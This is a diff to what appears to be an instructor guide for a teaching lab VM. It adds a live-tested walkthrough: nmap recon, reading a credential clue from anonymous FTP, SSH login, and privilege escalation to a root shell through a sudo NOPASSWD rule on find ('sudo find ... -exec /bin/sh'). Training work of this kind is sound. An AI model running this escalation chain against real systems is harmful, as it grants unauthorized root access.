@@ -50,17 +50,58 @@ The exact scanning and FTP client commands may vary. The intended observations a
 6. `sudo -l` exposes the exact `/usr/bin/find` NOPASSWD rule.
 7. The learner uses the delegated `find` command-execution feature to run a controlled identity check or obtain the intended root shell.
 
-A minimal controlled proof is conceptually equivalent to:
+### Live-Tested Exploitation Transcript
 
-```bash
-sudo /usr/bin/find /dev/null -maxdepth 0 -exec /usr/bin/id -u \;
-```
+The route below was executed end-to-end from a Kali attacker VM against the reference CAV-CSF VM (`192.168.200.137`) on 3 August 2026, as an approved instructor-controlled validation pass. The generated `stockroom` password is instance-specific and shown here as `<TEACHING_PASSWORD>`; it changes on every install/reset and must never be committed to the repository or issued to students.
 
-Expected output:
+**1. Recon**
 
 ```text
-0
+$ nmap -sV -p21,22,80,2121,22222 192.168.200.137
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.5
+22/tcp    open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.5
+80/tcp    open  http    Apache httpd 2.4.66 ((Ubuntu))
+2121/tcp  open  ftp     ProFTPD 1.3.5
+22222/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.5
 ```
+
+**2. Anonymous FTP clue**
+
+```text
+$ curl -s ftp://192.168.200.137/support-ticket-BL-48217.txt
+...
+    profile: stockroom
+    temporary phrase: <TEACHING_PASSWORD>
+...
+```
+
+**3. Teaching SSH access and enumeration**
+
+```text
+$ ssh stockroom@192.168.200.137
+stockroom@192.168.200.137's password: <TEACHING_PASSWORD>
+stockroom@cav-csf-linux:~$ id
+uid=1001(stockroom) gid=1001(stockroom) groups=1001(stockroom)
+stockroom@cav-csf-linux:~$ sudo -l
+User stockroom may run the following commands on cav-csf-linux:
+    (root) NOPASSWD: /usr/bin/find
+```
+
+**4. Privilege escalation**
+
+```text
+stockroom@cav-csf-linux:~$ sudo /usr/bin/find /dev/null -maxdepth 0 -exec /usr/bin/id -u \;
+0
+stockroom@cav-csf-linux:~$ sudo /usr/bin/find /dev/null -maxdepth 0 -exec /bin/sh \;
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# exit
+```
+
+This confirms the complete chain works exactly as designed, from unauthenticated network recon through to a real root shell, with no deviation from the documented route.
 
 For a shell-based demonstration, students may use the same documented command-execution property, confirm `id`, collect evidence and exit immediately. They must not create persistence or modify administrator material.
 
